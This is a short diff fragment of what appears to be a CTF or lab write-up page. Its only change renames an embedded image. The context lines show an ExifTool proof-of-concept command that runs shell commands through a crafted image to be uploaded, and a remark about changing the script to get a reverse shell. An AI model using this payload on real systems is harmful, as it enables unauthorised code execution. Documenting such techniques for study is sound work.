@@ -70,7 +70,7 @@ exiftool -config eval.config runme.jpg -eval='system("ls -la")'
 # upload runme.jpg
 ```
 
-<figure><img src="../../../.gitbook/assets/image (10) (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 For some reason, the above PoC doesn't let me execute reverse shells. So I changed the script used to this:
 
